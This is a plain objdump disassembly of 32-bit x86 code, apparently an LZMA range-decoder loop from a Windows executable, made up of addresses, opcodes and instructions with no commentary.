  406bfb:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406bfe:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406c01:	c1 e8 07             	shr    $0x7,%eax
  406c04:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406c07:	40                   	inc    %eax
  406c08:	c1 e0 08             	shl    $0x8,%eax
  406c0b:	03 c3                	add    %ebx,%eax
  406c0d:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406c10:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406c13:	c1 e9 0b             	shr    $0xb,%ecx
  406c16:	66 8b 06             	mov    (%esi),%ax
  406c19:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406c1c:	0f b7 d0             	movzwl %ax,%edx
  406c1f:	0f af ca             	imul   %edx,%ecx
  406c22:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406c25:	73 1a                	jae    0x406c41
  406c27:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406c2b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406c2e:	b9 00 08 00 00       	mov    $0x800,%ecx
  406c33:	2b ca                	sub    %edx,%ecx
  406c35:	c1 f9 05             	sar    $0x5,%ecx
  406c38:	03 c8                	add    %eax,%ecx
  406c3a:	03 db                	add    %ebx,%ebx
  406c3c:	66 89 0e             	mov    %cx,(%esi)
  406c3f:	eb 1d                	jmp    0x406c5e
  406c41:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406c44:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406c47:	66 8b c8             	mov    %ax,%cx
  406c4a:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406c51:	66 c1 e9 05          	shr    $0x5,%cx
  406c55:	2b c1                	sub    %ecx,%eax
  406c57:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406c5b:	66 89 06             	mov    %ax,(%esi)
  406c5e:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406c65:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406c68:	0f 83 71 ff ff ff    	jae    0x406bdf
  406c6e:	e9 47 ff ff ff       	jmp    0x406bba
  406c73:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c77:	0f 84 ba 06 00 00    	je     0x407337
  406c7d:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c80:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c83:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406c87:	0f b6 09             	movzbl (%ecx),%ecx
  406c8a:	ff 4d 94             	decl   -0x6c(%ebp)
  406c8d:	c1 e0 08             	shl    $0x8,%eax
  406c90:	0b c1                	or     %ecx,%eax
  406c92:	ff 45 90             	incl   -0x70(%ebp)
  406c95:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c98:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406c9e:	7d 5c                	jge    0x406cfc
  406ca0:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406ca3:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406ca6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406ca9:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406cac:	c1 e9 0b             	shr    $0xb,%ecx
  406caf:	66 8b 06             	mov    (%esi),%ax
  406cb2:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406cb5:	0f b7 f8             	movzwl %ax,%edi
  406cb8:	0f af cf             	imul   %edi,%ecx
  406cbb:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406cbe:	73 16                	jae    0x406cd6
  406cc0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406cc3:	b9 00 08 00 00       	mov    $0x800,%ecx
  406cc8:	2b cf                	sub    %edi,%ecx
  406cca:	c1 f9 05             	sar    $0x5,%ecx
  406ccd:	03 c8                	add    %eax,%ecx
  406ccf:	03 db                	add    %ebx,%ebx
  406cd1:	66 89 0e             	mov    %cx,(%esi)
  406cd4:	eb 15                	jmp    0x406ceb
  406cd6:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406cd9:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406cdc:	66 8b c8             	mov    %ax,%cx
  406cdf:	8d 5a 01             	lea    0x1(%edx),%ebx
  406ce2:	66 c1 e9 05          	shr    $0x5,%cx
  406ce6:	2b c1                	sub    %ecx,%eax
  406ce8:	66 89 06             	mov    %ax,(%esi)
  406ceb:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406cf2:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406cf5:	73 a1                	jae    0x406c98
  406cf7:	e9 77 ff ff ff       	jmp    0x406c73
  406cfc:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406d00:	8a 45 bc             	mov    -0x44(%ebp),%al
  406d03:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406d06:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406d0a:	0f 84 3f 06 00 00    	je     0x40734f
  406d10:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406d13:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406d16:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406d19:	ff 45 a0             	incl   -0x60(%ebp)
  406d1c:	ff 45 98             	incl   -0x68(%ebp)
  406d1f:	ff 4d 9c             	decl   -0x64(%ebp)
  406d22:	88 01                	mov    %al,(%ecx)
  406d24:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406d27:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406d2a:	8d 41 01             	lea    0x1(%ecx),%eax
  406d2d:	33 d2                	xor    %edx,%edx
  406d2f:	f7 75 8c             	divl   -0x74(%ebp)
  406d32:	e9 95 01 00 00       	jmp    0x406ecc
  406d37:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406d3b:	0f 84 02 06 00 00    	je     0x407343
  406d41:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d44:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d47:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406d4b:	0f b6 09             	movzbl (%ecx),%ecx
  406d4e:	ff 4d 94             	decl   -0x6c(%ebp)
  406d51:	c1 e0 08             	shl    $0x8,%eax
  406d54:	0b c1                	or     %ecx,%eax
  406d56:	ff 45 90             	incl   -0x70(%ebp)
  406d59:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d5c:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406d62:	7d 9c                	jge    0x406d00
  406d64:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406d67:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406d6a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d6d:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406d70:	c1 e9 0b             	shr    $0xb,%ecx
  406d73:	66 8b 06             	mov    (%esi),%ax
  406d76:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406d79:	0f b7 f8             	movzwl %ax,%edi
  406d7c:	0f af cf             	imul   %edi,%ecx
  406d7f:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406d82:	73 16                	jae    0x406d9a
  406d84:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406d87:	b9 00 08 00 00       	mov    $0x800,%ecx
  406d8c:	2b cf                	sub    %edi,%ecx
  406d8e:	c1 f9 05             	sar    $0x5,%ecx
  406d91:	03 c8                	add    %eax,%ecx
  406d93:	03 db                	add    %ebx,%ebx
  406d95:	66 89 0e             	mov    %cx,(%esi)
  406d98:	eb 15                	jmp    0x406daf
  406d9a:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406d9d:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406da0:	66 8b c8             	mov    %ax,%cx
  406da3:	8d 5a 01             	lea    0x1(%edx),%ebx
  406da6:	66 c1 e9 05          	shr    $0x5,%cx
  406daa:	2b c1                	sub    %ecx,%eax
  406dac:	66 89 06             	mov    %ax,(%esi)
  406daf:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406db6:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406db9:	73 a1                	jae    0x406d5c
  406dbb:	e9 77 ff ff ff       	jmp    0x406d37
  406dc0:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406dc4:	75 1c                	jne    0x406de2
  406dc6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406dc9:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406dcc:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406dd3:	00 00 00 
  406dd6:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406ddd:	e9 ab 03 00 00       	jmp    0x40718d
  406de2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406de5:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406dec:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406def:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406df2:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406df5:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406df8:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406dfb:	33 c0                	xor    %eax,%eax
  406dfd:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406e01:	0f 9d c0             	setge  %al
  406e04:	48                   	dec    %eax
  406e05:	24 fd                	and    $0xfd,%al
  406e07:	83 c0 0a             	add    $0xa,%eax
  406e0a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406e0d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e10:	05 64 06 00 00       	add    $0x664,%eax
  406e15:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406e18:	8b 75 a8             	mov    -0x58(%ebp),%esi
  406e1b:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  406e22:	00 00 00 
  406e25:	e9 63 03 00 00       	jmp    0x40718d
  406e2a:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406e2e:	75 21                	jne    0x406e51
  406e30:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406e33:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406e36:	83 c0 0f             	add    $0xf,%eax
  406e39:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406e40:	00 00 00 
  406e43:	c1 e0 04             	shl    $0x4,%eax
  406e46:	03 45 b4             	add    -0x4c(%ebp),%eax
  406e49:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406e4c:	e9 3c 03 00 00       	jmp    0x40718d
  406e51:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e54:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406e57:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406e5e:	00 00 00 
  406e61:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406e68:	e9 20 03 00 00       	jmp    0x40718d
  406e6d:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406e71:	0f 85 b1 00 00 00    	jne    0x406f28
  406e77:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406e7b:	0f 84 3b 05 00 00    	je     0x4073bc
  406e81:	33 c0                	xor    %eax,%eax
  406e83:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406e87:	0f 9d c0             	setge  %al
  406e8a:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406e8e:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406e91:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406e95:	0f 84 c0 04 00 00    	je     0x40735b
  406e9b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406e9e:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406ea1:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406ea4:	72 03                	jb     0x406ea9
  406ea6:	03 45 8c             	add    -0x74(%ebp),%eax
  406ea9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406eac:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406eaf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406eb2:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406eb5:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406eb8:	40                   	inc    %eax
  406eb9:	33 d2                	xor    %edx,%edx
  406ebb:	f7 75 8c             	divl   -0x74(%ebp)
  406ebe:	8b 45 98             	mov    -0x68(%ebp),%eax
  406ec1:	ff 45 a0             	incl   -0x60(%ebp)
  406ec4:	ff 45 98             	incl   -0x68(%ebp)
  406ec7:	ff 4d 9c             	decl   -0x64(%ebp)
  406eca:	88 08                	mov    %cl,(%eax)
  406ecc:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406ecf:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  406ed6:	00 00 00 
  406ed9:	e9 c7 fa ff ff       	jmp    0x4069a5
  406ede:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406ee2:	75 05                	jne    0x406ee9
  406ee4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406ee7:	eb 36                	jmp    0x406f1f
  406ee9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406eec:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406eef:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  406ef6:	00 00 00 
  406ef9:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  406f00:	e9 88 02 00 00       	jmp    0x40718d
  406f05:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406f09:	75 05                	jne    0x406f10
  406f0b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406f0e:	eb 09                	jmp    0x406f19
  406f10:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406f13:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406f16:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406f19:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406f1c:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  406f1f:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  406f22:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406f25:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  406f28:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f2b:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  406f32:	05 68 0a 00 00       	add    $0xa68,%eax
  406f37:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406f3a:	e9 d9 fe ff ff       	jmp    0x406e18
  406f3f:	33 c0                	xor    %eax,%eax
  406f41:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406f45:	0f 9d c0             	setge  %al
  406f48:	48                   	dec    %eax
  406f49:	24 fd                	and    $0xfd,%al
  406f4b:	83 c0 0b             	add    $0xb,%eax
  406f4e:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406f51:	e9 9a 01 00 00       	jmp    0x4070f0
  406f56:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406f59:	83 f8 04             	cmp    $0x4,%eax
  406f5c:	7c 03                	jl     0x406f61
  406f5e:	6a 03                	push   $0x3
  406f60:	58                   	pop    %eax
  406f61:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406f64:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  406f6b:	c1 e0 07             	shl    $0x7,%eax
  406f6e:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  406f75:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  406f7c:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406f7f:	e9 ce 02 00 00       	jmp    0x407252
  406f84:	83 fb 04             	cmp    $0x4,%ebx
  406f87:	7c 34                	jl     0x406fbd
  406f89:	8b cb                	mov    %ebx,%ecx
  406f8b:	8b c3                	mov    %ebx,%eax
  406f8d:	d1 f9                	sar    $1,%ecx
  406f8f:	83 e0 01             	and    $0x1,%eax
  406f92:	49                   	dec    %ecx
  406f93:	0c 02                	or     $0x2,%al
  406f95:	d3 e0                	shl    %cl,%eax
  406f97:	83 fb 0e             	cmp    $0xe,%ebx
  406f9a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406f9d:	7d 14                	jge    0x406fb3
  406f9f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406fa2:	2b c3                	sub    %ebx,%eax
  406fa4:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  406fa7:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406fae:	e9 81 00 00 00       	jmp    0x407034
  406fb3:	33 db                	xor    %ebx,%ebx
  406fb5:	83 c1 fc             	add    $0xfffffffc,%ecx
  406fb8:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  406fbb:	eb 33                	jmp    0x406ff0
  406fbd:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406fc0:	e9 28 01 00 00       	jmp    0x4070ed
  406fc5:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406fc9:	0f 84 98 03 00 00    	je     0x407367
  406fcf:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406fd2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406fd5:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406fd9:	0f b6 09             	movzbl (%ecx),%ecx
  406fdc:	ff 4d 94             	decl   -0x6c(%ebp)
  406fdf:	c1 e0 08             	shl    $0x8,%eax
  406fe2:	0b c1                	or     %ecx,%eax
  406fe4:	ff 45 90             	incl   -0x70(%ebp)
  406fe7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406fea:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406fed:	ff 4d b8             	decl   -0x48(%ebp)
  406ff0:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406ff4:	7e 27                	jle    0x40701d
  406ff6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406ff9:	03 db                	add    %ebx,%ebx
  406ffb:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  406ffe:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  407001:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407004:	72 0c                	jb     0x407012
  407006:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407009:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40700c:	83 cb 01             	or     $0x1,%ebx
  40700f:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407012:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407019:	73 d2                	jae    0x406fed
  40701b:	eb a8                	jmp    0x406fc5
  40701d:	c1 e3 04             	shl    $0x4,%ebx
  407020:	03 c3                	add    %ebx,%eax
  407022:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  407029:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40702c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40702f:	05 44 06 00 00       	add    $0x644,%eax
  407034:	33 db                	xor    %ebx,%ebx
  407036:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407039:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  407040:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407043:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  407046:	eb 28                	jmp    0x407070
  407048:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40704c:	0f 84 21 03 00 00    	je     0x407373
  407052:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407055:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407058:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40705c:	0f b6 09             	movzbl (%ecx),%ecx
  40705f:	ff 4d 94             	decl   -0x6c(%ebp)
  407062:	c1 e0 08             	shl    $0x8,%eax
  407065:	0b c1                	or     %ecx,%eax
  407067:	ff 45 90             	incl   -0x70(%ebp)
  40706a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40706d:	ff 45 b8             	incl   -0x48(%ebp)
  407070:	8b 45 c0             	mov    -0x40(%ebp),%eax
  407073:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  407076:	7d 72                	jge    0x4070ea
  407078:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40707b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40707e:	c1 ea 0b             	shr    $0xb,%edx
  407081:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  407084:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407087:	8d 34 07             	lea    (%edi,%eax,1),%esi
  40708a:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40708d:	66 8b 06             	mov    (%esi),%ax
  407090:	0f b7 c8             	movzwl %ax,%ecx
  407093:	0f af d1             	imul   %ecx,%edx
  407096:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  407099:	73 17                	jae    0x4070b2
  40709b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40709e:	ba 00 08 00 00       	mov    $0x800,%edx
  4070a3:	2b d1                	sub    %ecx,%edx
  4070a5:	c1 fa 05             	sar    $0x5,%edx
  4070a8:	03 d0                	add    %eax,%edx
  4070aa:	d1 65 b0             	shll   $1,-0x50(%ebp)
  4070ad:	66 89 16             	mov    %dx,(%esi)
  4070b0:	eb 2a                	jmp    0x4070dc
  4070b2:	33 c9                	xor    %ecx,%ecx
  4070b4:	29 55 f0             	sub    %edx,-0x10(%ebp)
  4070b7:	41                   	inc    %ecx
  4070b8:	29 55 f4             	sub    %edx,-0xc(%ebp)
  4070bb:	8b d9                	mov    %ecx,%ebx
  4070bd:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4070c0:	d3 e3                	shl    %cl,%ebx
  4070c2:	8b cb                	mov    %ebx,%ecx
  4070c4:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  4070c7:	0b d9                	or     %ecx,%ebx
  4070c9:	66 8b c8             	mov    %ax,%cx
  4070cc:	66 c1 e9 05          	shr    $0x5,%cx
  4070d0:	2b c1                	sub    %ecx,%eax
  4070d2:	47                   	inc    %edi
  4070d3:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4070d6:	66 89 06             	mov    %ax,(%esi)
  4070d9:	89 7d b0             	mov    %edi,-0x50(%ebp)
  4070dc:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4070e3:	73 88                	jae    0x40706d
  4070e5:	e9 5e ff ff ff       	jmp    0x407048
  4070ea:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  4070ed:	ff 45 d4             	incl   -0x2c(%ebp)
  4070f0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4070f3:	85 c0                	test   %eax,%eax
  4070f5:	0f 84 84 02 00 00    	je     0x40737f
  4070fb:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  4070fe:	0f 87 b8 02 00 00    	ja     0x4073bc
  407104:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  407108:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40710b:	01 45 a0             	add    %eax,-0x60(%ebp)
  40710e:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  407112:	0f 84 6d 02 00 00    	je     0x407385
  407118:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40711b:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40711e:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  407121:	72 03                	jb     0x407126
  407123:	03 45 8c             	add    -0x74(%ebp),%eax
  407126:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407129:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  40712c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40712f:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  407132:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  407135:	40                   	inc    %eax
  407136:	33 d2                	xor    %edx,%edx
  407138:	f7 75 8c             	divl   -0x74(%ebp)
  40713b:	8b 45 98             	mov    -0x68(%ebp),%eax
  40713e:	ff 45 98             	incl   -0x68(%ebp)
  407141:	ff 4d 9c             	decl   -0x64(%ebp)
  407144:	ff 4d d0             	decl   -0x30(%ebp)
  407147:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  40714b:	88 08                	mov    %cl,(%eax)
  40714d:	89 55 ec             	mov    %edx,-0x14(%ebp)
  407150:	7f bc                	jg     0x40710e
  407152:	e9 78 fd ff ff       	jmp    0x406ecf
  407157:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40715b:	75 20                	jne    0x40717d
  40715d:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  407160:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  407164:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  407167:	c1 e0 04             	shl    $0x4,%eax
  40716a:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  40716e:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407171:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  407178:	e9 ce 00 00 00       	jmp    0x40724b
  40717d:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407180:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  407187:	00 00 00 
  40718a:	8d 70 02             	lea    0x2(%eax),%esi
  40718d:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407190:	66 8b 06             	mov    (%esi),%ax
  407193:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407196:	0f b7 d0             	movzwl %ax,%edx
  407199:	c1 e9 0b             	shr    $0xb,%ecx
  40719c:	0f af ca             	imul   %edx,%ecx
  40719f:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4071a2:	73 18                	jae    0x4071bc
  4071a4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4071a7:	b9 00 08 00 00       	mov    $0x800,%ecx
  4071ac:	2b ca                	sub    %edx,%ecx
  4071ae:	c1 f9 05             	sar    $0x5,%ecx
  4071b1:	03 c8                	add    %eax,%ecx
  4071b3:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  4071b7:	66 89 0e             	mov    %cx,(%esi)
  4071ba:	eb 19                	jmp    0x4071d5
  4071bc:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4071bf:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4071c2:	66 8b c8             	mov    %ax,%cx
  4071c5:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  4071cc:	66 c1 e9 05          	shr    $0x5,%cx
  4071d0:	2b c1                	sub    %ecx,%eax
  4071d2:	66 89 06             	mov    %ax,(%esi)
  4071d5:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4071dc:	73 25                	jae    0x407203
  4071de:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4071e2:	0f 84 a9 01 00 00    	je     0x407391
  4071e8:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4071eb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4071ee:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4071f2:	0f b6 09             	movzbl (%ecx),%ecx
  4071f5:	ff 4d 94             	decl   -0x6c(%ebp)
  4071f8:	c1 e0 08             	shl    $0x8,%eax
  4071fb:	0b c1                	or     %ecx,%eax
  4071fd:	ff 45 90             	incl   -0x70(%ebp)
  407200:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407203:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  407209:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40720f:	e9 91 f7 ff ff       	jmp    0x4069a5
  407214:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407218:	75 1c                	jne    0x407236
  40721a:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40721d:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  407220:	c1 e0 04             	shl    $0x4,%eax
  407223:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  40722a:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  407231:	e9 38 ff ff ff       	jmp    0x40716e
  407236:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  40723d:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  407244:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  40724b:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  407252:	8b 45 c0             	mov    -0x40(%ebp),%eax
  407255:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  40725c:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40725f:	eb 28                	jmp    0x407289
  407261:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407265:	0f 84 32 01 00 00    	je     0x40739d
  40726b:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40726e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407271:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407275:	0f b6 09             	movzbl (%ecx),%ecx
  407278:	ff 4d 94             	decl   -0x6c(%ebp)
  40727b:	c1 e0 08             	shl    $0x8,%eax
  40727e:	0b c1                	or     %ecx,%eax
